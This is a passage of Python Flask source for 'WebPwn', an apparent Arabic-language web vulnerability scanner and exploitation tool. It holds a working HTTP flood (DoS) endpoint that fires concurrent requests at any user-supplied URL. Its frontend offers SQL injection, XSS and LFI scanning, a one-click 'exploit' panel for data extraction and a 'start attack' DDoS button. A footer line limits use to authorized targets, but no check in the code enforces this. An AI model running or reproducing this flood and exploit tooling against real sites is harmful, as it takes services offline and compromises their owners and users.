def api_ddos():
    """
    Real HTTP Flood / DoS module.
    Launches concurrent requests against the target.
    """
    data = request.get_json() or {}
    target = data.get("url", "").strip()
    threads = min(int(data.get("threads", 50)), 300)          # hard limit
    requests_per_thread = min(int(data.get("requests", 20)), 100)
    method = data.get("method", "GET").upper()
    duration = min(int(data.get("duration", 0)), 60)          # seconds, 0 = fixed count
    path = data.get("path", "/")

    if not target:
        return jsonify({"error": "URL required"}), 400

    target = normalize_url(target)
    if not target.endswith("/") and not path.startswith("http"):
        flood_url = urljoin(target + "/", path.lstrip("/"))
    else:
        flood_url = target if path == "/" else urljoin(target + "/", path.lstrip("/"))

    total_sent = 0
    total_success = 0
    total_fail = 0
    status_codes = {}
    start_time = time.time()

    def worker(n_requests):
        nonlocal total_sent, total_success, total_fail
        local_success = 0
        local_fail = 0
        local_codes = {}
        session = requests.Session()
        session.verify = False
        headers = DEFAULT_HEADERS.copy()
        headers["Connection"] = "keep-alive"
        headers["Cache-Control"] = "no-cache"
        headers["Pragma"] = "no-cache"

        end_by_time = time.time() + duration if duration > 0 else None
        count = 0

        while True:
            if end_by_time and time.time() >= end_by_time:
                break
            if duration == 0 and count >= n_requests:
                break

            try:
                if method == "GET":
                    r = session.get(flood_url, headers=headers, timeout=6, allow_redirects=False)
                elif method == "POST":
                    r = session.post(flood_url, headers=headers, data={"x": "1"}, timeout=6, allow_redirects=False)
                else:
                    r = session.request(method, flood_url, headers=headers, timeout=6, allow_redirects=False)

                code = r.status_code
                local_codes[code] = local_codes.get(code, 0) + 1
                local_success += 1
            except Exception:
                local_fail += 1
            count += 1

        return local_success, local_fail, local_codes, count

    # Launch workers
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(worker, requests_per_thread) for _ in range(threads)]
        for fut in concurrent.futures.as_completed(futures):
            try:
                s, f, codes, sent = fut.result()
                total_success += s
                total_fail += f
                total_sent += sent
                for code, cnt in codes.items():
                    status_codes[code] = status_codes.get(code, 0) + cnt
            except Exception:
                total_fail += 1

    elapsed = round(time.time() - start_time, 2)
    rps = round(total_sent / elapsed, 1) if elapsed > 0 else 0

    return jsonify({
        "target": flood_url,
        "threads": threads,
        "total_sent": total_sent,
        "success": total_success,
        "failed": total_fail,
        "status_codes": status_codes,
        "elapsed": elapsed,
        "requests_per_second": rps,
        "method": method
    })


# ====================== FRONTEND ======================
HTML_TEMPLATE = r'''<!DOCTYPE html>

<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>WebPwn — ماسح الثغرات والاستغلال</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Arabic:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
  <script>
    tailwind.config = {
      theme: {
        extend: {
          fontFamily: {
            sans: ['IBM Plex Sans Arabic', 'system-ui', 'sans-serif'],
            mono: ['JetBrains Mono', 'monospace'],
          },
          colors: {
            cyber: {
              950: '#0a0e17',
              900: '#0f1623',
              800: '#151d2e',
              700: '#1c273b',
              600: '#243247',
              accent: '#00ff9d',
              danger: '#ff2a6d',
              warn: '#f9f871',
              info: '#05d9e8',
            }
          }
        }
      }
    }
  </script>
  <style>
    body { background: #0a0e17; }
    .glow { text-shadow: 0 0 12px rgba(0,255,157,0.5); }
    .scan-line {
      background: linear-gradient(90deg, transparent, rgba(0,255,157,0.15), transparent);
      animation: scan 2.5s linear infinite;
    }
    @keyframes scan {
      0% { transform: translateX(-100%); }
      100% { transform: translateX(100%); }
    }
    .sev-critical { border-right: 4px solid #ff2a6d; background: rgba(255,42,109,0.08); }
    .sev-high { border-right: 4px solid #ff6b35; background: rgba(255,107,53,0.07); }
    .sev-medium { border-right: 4px solid #f9f871; background: rgba(249,248,113,0.06); }
    .sev-low { border-right: 4px solid #05d9e8; background: rgba(5,217,232,0.05); }
    .sev-info { border-right: 4px solid #6b7280; background: rgba(107,114,128,0.05); }
    ::-webkit-scrollbar { width: 8px; height: 8px; }
    ::-webkit-scrollbar-track { background: #0f1623; }
    ::-webkit-scrollbar-thumb { background: #243247; border-radius: 4px; }
    .terminal { font-family: 'JetBrains Mono', monospace; }
  </style>
</head>
<body class="text-gray-200 font-sans min-h-screen">
  <!-- Header -->
  <header class="border-b border-cyber-700 bg-cyber-900/80 backdrop-blur sticky top-0 z-50">
    <div class="max-w-7xl mx-auto px-4 py-3 flex items-center justify-between">
      <div class="flex items-center gap-3">
        <div class="w-10 h-10 rounded-lg bg-gradient-to-br from-cyber-accent to-cyber-info flex items-center justify-center text-cyber-950 font-bold text-lg">W</div>
        <div>
          <h1 class="text-xl font-bold tracking-tight glow text-cyber-accent">WebPwn</h1>
          <p class="text-xs text-gray-500">ماسح ثغرات ومُستغِل ويب — Full Fidelity</p>
        </div>
      </div>
      <div class="text-xs text-gray-500 terminal hidden sm:block">v1.0 • Offline-capable scanner</div>
    </div>
  </header>

  <main class="max-w-7xl mx-auto px-4 py-6 space-y-6">
    <!-- Target Input -->
    <section class="bg-cyber-900 border border-cyber-700 rounded-xl p-5 relative overflow-hidden">
      <div class="absolute inset-0 scan-line pointer-events-none opacity-40"></div>
      <div class="relative z-10">
        <label class="block text-sm text-gray-400 mb-2">الهدف (URL)</label>
        <div class="flex flex-col sm:flex-row gap-3">
          <input id="targetUrl" type="text" placeholder="https://example.com أو example.com" 
                 class="flex-1 bg-cyber-950 border border-cyber-600 rounded-lg px-4 py-3 text-sm focus:outline-none focus:border-cyber-accent focus:ring-1 focus:ring-cyber-accent terminal"
                 value="" />
          <button id="scanBtn" onclick="startScan()" 
                  class="px-6 py-3 bg-cyber-accent text-cyber-950 font-semibold rounded-lg hover:bg-emerald-400 transition flex items-center justify-center gap-2 min-w-[140px]">
            <span id="scanBtnText">ابدأ الفحص</span>
            <svg id="scanSpinner" class="hidden animate-spin w-5 h-5" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path></svg>
          </button>
        </div>
        
        <!-- Modules -->
        <div class="mt-4 flex flex-wrap gap-3 text-sm">
          <label class="flex items-center gap-1.5 cursor-pointer"><input type="checkbox" class="mod" value="fingerprint" checked class="accent-cyber-accent"> بصمة التقنيات</label>
          <label class="flex items-center gap-1.5 cursor-pointer"><input type="checkbox" class="mod" value="ssl" checked class="accent-cyber-accent"> SSL/TLS</label>
          <label class="flex items-center gap-1.5 cursor-pointer"><input type="checkbox" class="mod" value="headers" checked class="accent-cyber-accent"> ترويسات الأمان</label>
          <label class="flex items-center gap-1.5 cursor-pointer"><input type="checkbox" class="mod" value="paths" checked class="accent-cyber-accent"> مسارات حساسة</label>
          <label class="flex items-center gap-1.5 cursor-pointer"><input type="checkbox" class="mod" value="sqli" checked class="accent-cyber-accent"> حقن SQL</label>
          <label class="flex items-center gap-1.5 cursor-pointer"><input type="checkbox" class="mod" value="xss" checked class="accent-cyber-accent"> XSS</label>
          <label class="flex items-center gap-1.5 cursor-pointer"><input type="checkbox" class="mod" value="lfi" checked class="accent-cyber-accent"> LFI / Path Traversal</label>
          <label class="flex items-center gap-1.5 cursor-pointer"><input type="checkbox" class="mod" value="redirect" checked class="accent-cyber-accent"> Open Redirect</label>
          <label class="flex items-center gap-1.5 cursor-pointer"><input type="checkbox" class="mod" value="cors" checked class="accent-cyber-accent"> CORS</label>
          <label class="flex items-center gap-1.5 cursor-pointer"><input type="checkbox" class="mod" value="info" checked class="accent-cyber-accent"> تسريب معلومات</label>
          <label class="flex items-center gap-1.5 cursor-pointer"><input type="checkbox" class="mod" value="methods" checked class="accent-cyber-accent"> HTTP Methods</label>
          <label class="flex items-center gap-1.5 cursor-pointer"><input type="checkbox" class="mod" value="dirlist" checked class="accent-cyber-accent"> Directory Listing</label>
          <label class="flex items-center gap-1.5 cursor-pointer"><input type="checkbox" class="mod" value="sourcemap" checked class="accent-cyber-accent"> Source Maps</label>
          <label class="flex items-center gap-1.5 cursor-pointer"><input type="checkbox" class="mod" value="csrf" checked class="accent-cyber-accent"> CSRF</label>

        </div>
      </div>
    </section>

    <!-- Summary Cards -->
    <section id="summarySection" class="hidden grid grid-cols-2 sm:grid-cols-5 gap-3">
      <div class="bg-cyber-900 border border-cyber-700 rounded-lg p-3 text-center">
        <div class="text-2xl font-bold text-cyber-danger" id="cntCritical">0</div>
        <div class="text-xs text-gray-500">حرج</div>
      </div>
      <div class="bg-cyber-900 border border-cyber-700 rounded-lg p-3 text-center">
        <div class="text-2xl font-bold text-orange-400" id="cntHigh">0</div>
        <div class="text-xs text-gray-500">عالي</div>
      </div>
      <div class="bg-cyber-900 border border-cyber-700 rounded-lg p-3 text-center">
        <div class="text-2xl font-bold text-cyber-warn" id="cntMedium">0</div>
        <div class="text-xs text-gray-500">متوسط</div>
      </div>
      <div class="bg-cyber-900 border border-cyber-700 rounded-lg p-3 text-center">
        <div class="text-2xl font-bold text-cyber-info" id="cntLow">0</div>
        <div class="text-xs text-gray-500">منخفض</div>
      </div>
      <div class="bg-cyber-900 border border-cyber-700 rounded-lg p-3 text-center">
        <div class="text-2xl font-bold text-gray-400" id="cntInfo">0</div>
        <div class="text-xs text-gray-500">معلومات</div>
      </div>
    </section>

    <!-- Results -->
    <section id="resultsSection" class="hidden space-y-3">
      <div class="flex items-center justify-between">
        <h2 class="text-lg font-semibold">نتائج الفحص <span id="elapsedBadge" class="text-sm text-gray-500 font-normal"></span></h2>
        <button onclick="clearResults()" class="text-xs text-gray-500 hover:text-white">مسح</button>
      </div>
      <div id="resultsList" class="space-y-2"></div>
    </section>

    <!-- Exploit Panel -->
    <section id="exploitPanel" class="hidden bg-cyber-900 border border-cyber-danger/40 rounded-xl p-5">
      <h2 class="text-lg font-semibold text-cyber-danger mb-3">لوحة الاستغلال</h2>
      <div id="exploitContent" class="space-y-3 text-sm"></div>
    </section>

    <!-- Raw Request (Advanced) -->
    <section class="bg-cyber-900 border border-cyber-700 rounded-xl p-5">
      <h2 class="text-lg font-semibold mb-3">طلب مخصص (استغلال متقدم)</h2>
      <div class="grid gap-3">
        <div class="flex gap-2">
          <select id="rawMethod" class="bg-cyber-950 border border-cyber-600 rounded px-3 py-2 text-sm terminal">
            <option>GET</option><option>POST</option><option>PUT</option><option>DELETE</option><option>OPTIONS</option>
          </select>
          <input id="rawUrl" type="text" placeholder="URL كامل" class="flex-1 bg-cyber-950 border border-cyber-600 rounded px-3 py-2 text-sm terminal" />
        </div>
        <textarea id="rawBody" rows="3" placeholder="Body (لـ POST/PUT) أو headers إضافية بصيغة JSON" class="bg-cyber-950 border border-cyber-600 rounded px-3 py-2 text-sm terminal w-full"></textarea>
        <button onclick="sendRaw()" class="self-start px-4 py-2 bg-cyber-700 hover:bg-cyber-600 rounded text-sm">إرسال الطلب</button>
        <pre id="rawOutput" class="hidden bg-cyber-950 border border-cyber-700 rounded p-3 text-xs terminal overflow-auto max-h-80 whitespace-pre-wrap"></pre>
      </div>
    </section>

    <!-- DDoS / HTTP Flood -->
    <section class="bg-cyber-900 border border-red-900/50 rounded-xl p-5">
      <h2 class="text-lg font-semibold mb-1 text-red-400">DDoS / HTTP Flood</h2>
      <p class="text-xs text-gray-500 mb-4">هجوم حقيقي بإرسال آلاف الطلبات المتزامنة (HTTP Flood)</p>
      
      <div class="grid sm:grid-cols-2 gap-3 mb-3">
        <div>
          <label class="text-xs text-gray-400 block mb-1">الهدف</label>
          <input id="ddosUrl" type="text" placeholder="https://target.com" class="w-full bg-cyber-950 border border-cyber-600 rounded px-3 py-2 text-sm terminal" />
        </div>
        <div>
          <label class="text-xs text-gray-400 block mb-1">المسار (اختياري)</label>
          <input id="ddosPath" type="text" value="/" class="w-full bg-cyber-950 border border-cyber-600 rounded px-3 py-2 text-sm terminal" />
        </div>
        <div>
          <label class="text-xs text-gray-400 block mb-1">عدد الـ Threads</label>
          <input id="ddosThreads" type="number" value="50" min="1" max="300" class="w-full bg-cyber-950 border border-cyber-600 rounded px-3 py-2 text-sm terminal" />
        </div>
        <div>
          <label class="text-xs text-gray-400 block mb-1">طلبات لكل Thread</label>
          <input id="ddosReqs" type="number" value="20" min="1" max="100" class="w-full bg-cyber-950 border border-cyber-600 rounded px-3 py-2 text-sm terminal" />
        </div>
        <div>
          <label class="text-xs text-gray-400 block mb-1">المدة بالثواني (0 = ثابت)</label>
          <input id="ddosDuration" type="number" value="0" min="0" max="60" class="w-full bg-cyber-950 border border-cyber-600 rounded px-3 py-2 text-sm terminal" />
        </div>
        <div>
          <label class="text-xs text-gray-400 block mb-1">Method</label>
          <select id="ddosMethod" class="w-full bg-cyber-950 border border-cyber-600 rounded px-3 py-2 text-sm terminal">
            <option>GET</option>
            <option>POST</option>
            <option>HEAD</option>
          </select>
        </div>
      </div>

      <button id="ddosBtn" onclick="startDDoS()" class="px-5 py-2.5 bg-red-600 hover:bg-red-500 text-white font-medium rounded-lg text-sm flex items-center gap-2">
        <span id="ddosBtnText">🚀 بدء الهجوم</span>
        <svg id="ddosSpinner" class="hidden animate-spin w-4 h-4" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path></svg>
      </button>

      <div id="ddosResult" class="hidden mt-4 bg-cyber-950 border border-cyber-700 rounded-lg p-4 text-sm terminal"></div>
    </section>

    <!-- Footer note -->
    <p class="text-center text-xs text-gray-600 pb-8">WebPwn يعمل محلياً في الساندبوكس. استخدمه فقط على أهداف مصرح بها.</p>
  </main>


  <script>
    let lastResults = [];
    let currentTarget = "";

    async function startScan() {
      const url = document.getElementById('targetUrl').value.trim();
      if (!url) { alert('أدخل رابط الهدف'); return; }
      
      const modules = [...document.querySelectorAll('.mod:checked')].map(c => c.value);
      if (modules.length === 0) { alert('اختر وحدة واحدة على الأقل'); return; }

      const btn = document.getElementById('scanBtn');
      const btnText = document.getElementById('scanBtnText');
      const spinner = document.getElementById('scanSpinner');
      btn.disabled = true;
      btnText.textContent = 'جاري الفحص...';
      spinner.classList.remove('hidden');
      document.getElementById('resultsSection').classList.add('hidden');
      document.getElementById('summarySection').classList.add('hidden');
      document.getElementById('exploitPanel').classList.add('hidden');

      try {
        const res = await fetch('/api/scan', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ url, modules })
        });
        const data = await res.json();
        if (data.error) throw new Error(data.error);
        
        currentTarget = data.target;
        lastResults = data.results || [];
        renderResults(data);
      } catch (e) {
        alert('خطأ: ' + e.message);
      } finally {
        btn.disabled = false;
        btnText.textContent = 'ابدأ الفحص';
        spinner.classList.add('hidden');
      }
    }

    function renderResults(data) {
      const s = data.summary || {};
      document.getElementById('cntCritical').textContent = s.critical || 0;
      document.getElementById('cntHigh').textContent = s.high || 0;
      document.getElementById('cntMedium').textContent = s.medium || 0;
      document.getElementById('cntLow').textContent = s.low || 0;
      document.getElementById('cntInfo').textContent = s.info || 0;
      document.getElementById('summarySection').classList.remove('hidden');
      document.getElementById('elapsedBadge').textContent = `(${data.elapsed}ث)`;

      const list = document.getElementById('resultsList');
      list.innerHTML = '';
      
      if (!data.results || data.results.length === 0) {
        list.innerHTML = '<div class="text-gray-500 text-sm p-4 text-center">لم يتم اكتشاف ثغرات بالوحدات المختارة</div>';
      } else {
        data.results.forEach((r, idx) => {
          const sev = r.severity || 'info';
          const canExploit = (['critical','high'].includes(sev) && (r.payload || r.param || r.url)) || 
                             (sev === 'medium' && (r.payload || (r.url && r.name && r.name.includes('Path'))));

          const el = document.createElement('div');
          el.className = `sev-${sev} rounded-lg p-4 border border-cyber-700`;
          el.innerHTML = `
            <div class="flex flex-wrap items-start justify-between gap-2">
              <div>
                <span class="inline-block px-2 py-0.5 text-xs rounded font-medium mb-1
                  ${sev==='critical'?'bg-cyber-danger/20 text-cyber-danger':
                    sev==='high'?'bg-orange-500/20 text-orange-400':
                    sev==='medium'?'bg-yellow-500/20 text-yellow-300':
                    sev==='low'?'bg-cyan-500/20 text-cyan-300':'bg-gray-500/20 text-gray-400'}">${sev.toUpperCase()}</span>
                <h3 class="font-medium text-white">${escapeHtml(r.name)}</h3>
                <p class="text-sm text-gray-400 mt-1">${escapeHtml(r.detail || '')}</p>
                ${r.evidence ? `<p class="text-xs text-gray-500 mt-1 terminal">دليل: ${escapeHtml(String(r.evidence).slice(0,120))}</p>` : ''}
                ${r.payload ? `<p class="text-xs text-cyber-accent mt-1 terminal">Payload: ${escapeHtml(r.payload.slice(0,80))}</p>` : ''}
              </div>
              ${canExploit ? `<button onclick="openExploit(${idx})" class="text-xs px-3 py-1.5 bg-cyber-danger/20 text-cyber-danger border border-cyber-danger/40 rounded hover:bg-cyber-danger/30">استغلال</button>` : ''}
            </div>
          `;
          list.appendChild(el);
        });
      }
      document.getElementById('resultsSection').classList.remove('hidden');
    }

    function openExploit(idx) {
      const r = lastResults[idx];
      if (!r) return;
      const panel = document.getElementById('exploitPanel');
      const content = document.getElementById('exploitContent');
      content.innerHTML = `
        <div class="bg-cyber-950 rounded p-3 terminal text-xs space-y-1">
          <div><span class="text-gray-500">النوع:</span> ${escapeHtml(r.name)}</div>
          <div><span class="text-gray-500">المعامل:</span> ${escapeHtml(r.param || '—')}</div>
          <div><span class="text-gray-500">الحمولة:</span> <span class="text-cyber-accent">${escapeHtml(r.payload || '—')}</span></div>
          <div><span class="text-gray-500">الرابط:</span> ${escapeHtml(r.url || currentTarget)}</div>
        </div>
        <button onclick="runExploit(${idx})" class="px-4 py-2 bg-cyber-danger text-white rounded text-sm font-medium hover:bg-pink-600">تنفيذ محاولة الاستغلال</button>
        <div id="exploitResult" class="hidden mt-3"></div>
      `;
      panel.classList.remove('hidden');
      panel.scrollIntoView({ behavior: 'smooth' });
    }

    async function runExploit(idx) {
      const r = lastResults[idx];
      const resDiv = document.getElementById('exploitResult');
      resDiv.classList.remove('hidden');
      resDiv.innerHTML = '<div class="text-sm text-gray-400">جاري محاولة الاستغلال...</div>';
      
      try {
        const res = await fetch('/api/exploit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            url: r.url || currentTarget,
            type: r.name,
            param: r.param || '',
            payload: r.payload || '',
            method: r.method || 'GET'
          })
        });
        const data = await res.json();
        let html = `<div class="bg-cyber-950 border border-cyber-700 rounded p-3 text-sm">`;
        html += `<div class="mb-2 font-medium ${data.success ? 'text-cyber-accent' : 'text-yellow-400'}">${data.success ? '✓ نجح الاستغلال' : '⚠ لم يكتمل الاستخراج التلقائي'}</div>`;
        (data.messages || []).forEach(m => { html += `<p class="text-gray-400 text-xs">${escapeHtml(m)}</p>`; });
        if (data.data && data.data.length) {
          html += `<pre class="mt-2 text-xs terminal text-cyber-accent overflow-auto max-h-48">${escapeHtml(JSON.stringify(data.data, null, 2))}</pre>`;
        }
        html += `</div>`;
        resDiv.innerHTML = html;
      } catch (e) {
        resDiv.innerHTML = `<div class="text-cyber-danger text-sm">خطأ: ${escapeHtml(e.message)}</div>`;
      }
    }

    async function sendRaw() {
      const method = document.getElementById('rawMethod').value;
      const url = document.getElementById('rawUrl').value.trim();
      const bodyRaw = document.getElementById('rawBody').value.trim();
      if (!url) { alert('أدخل الرابط'); return; }
      
      let body = null, headers = {};
      if (bodyRaw) {
        try {
          const parsed = JSON.parse(bodyRaw);
          if (parsed.headers) headers = parsed.headers;
          if (parsed.body !== undefined) body = parsed.body;
          else if (!parsed.headers) body = bodyRaw;
        } catch {
          body = bodyRaw;
        }
      }
      
      const out = document.getElementById('rawOutput');
      out.classList.remove('hidden');
      out.textContent = 'جاري الإرسال...';
      
      try {
        const res = await fetch('/api/raw', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ url, method, body, headers })
        });
        const data = await res.json();
        if (data.error) {
          out.textContent = 'Error: ' + data.error;
        } else {
          out.textContent = `HTTP ${data.status} (${data.elapsed}s)\nURL: ${data.url}\n\n--- Headers ---\n${JSON.stringify(data.headers, null, 2)}\n\n--- Body ---\n${data.body}`;
        }
      } catch (e) {
        out.textContent = 'Error: ' + e.message;
      }
    }

    function clearResults() {
      document.getElementById('resultsSection').classList.add('hidden');
      document.getElementById('summarySection').classList.add('hidden');
      document.getElementById('exploitPanel').classList.add('hidden');
      lastResults = [];
    }

    async function startDDoS() {
      const url = document.getElementById('ddosUrl').value.trim();
      if (!url) { alert('أدخل رابط الهدف'); return; }

      const threads = parseInt(document.getElementById('ddosThreads').value) || 50;
      const requests = parseInt(document.getElementById('ddosReqs').value) || 20;
      const duration = parseInt(document.getElementById('ddosDuration').value) || 0;
      const method = document.getElementById('ddosMethod').value;
      const path = document.getElementById('ddosPath').value || '/';

      const btn = document.getElementById('ddosBtn');
      const btnText = document.getElementById('ddosBtnText');
      const spinner = document.getElementById('ddosSpinner');
      const resultDiv = document.getElementById('ddosResult');

      btn.disabled = true;
      btnText.textContent = 'جاري الهجوم...';
      spinner.classList.remove('hidden');
      resultDiv.classList.add('hidden');

      try {
        const res = await fetch('/api/ddos', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ url, threads, requests, duration, method, path })
        });
        const data = await res.json();
        if (data.error) throw new Error(data.error);

        let codesHtml = '';
        if (data.status_codes) {
          codesHtml = Object.entries(data.status_codes)
            .map(([code, cnt]) => `<span class="inline-block ml-2 px-2 py-0.5 rounded bg-cyber-800">${code}: ${cnt}</span>`)
            .join('');
        }

        resultDiv.innerHTML = `
          <div class="space-y-2">
            <div class="text-red-400 font-medium">✓ انتهى الهجوم</div>
            <div><span class="text-gray-500">الهدف:</span> ${escapeHtml(data.target)}</div>
            <div><span class="text-gray-500">Threads:</span> ${data.threads} &nbsp;|&nbsp; <span class="text-gray-500">Method:</span> ${data.method}</div>
            <div><span class="text-gray-500">إجمالي الطلبات:</span> <span class="text-cyber-accent">${data.total_sent}</span></div>
            <div><span class="text-gray-500">ناجح:</span> <span class="text-green-400">${data.success}</span> &nbsp;|&nbsp; <span class="text-gray-500">فشل:</span> <span class="text-red-400">${data.failed}</span></div>
            <div><span class="text-gray-500">الوقت:</span> ${data.elapsed}ث &nbsp;|&nbsp; <span class="text-gray-500">السرعة:</span> <span class="text-cyber-accent">${data.requests_per_second} req/s</span></div>
            <div class="pt-1">${codesHtml}</div>
          </div>
        `;
        resultDiv.classList.remove('hidden');
      } catch (e) {
        resultDiv.innerHTML = `<div class="text-red-400">خطأ: ${escapeHtml(e.message)}</div>`;
        resultDiv.classList.remove('hidden');
      } finally {
        btn.disabled = false;
        btnText.textContent = '🚀 بدء الهجوم';
        spinner.classList.add('hidden');
      }
    }

    function escapeHtml(s) {
      if (!s) return '';
      return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
    }


    // Enter key
    document.getElementById('targetUrl').addEventListener('keydown', e => {
      if (e.key === 'Enter') startScan();
    });
  </script>
</body>
</html>
'''

if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 5000))
    print(f"WebPwn starting on http://0.0.0.0:{port}")
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)

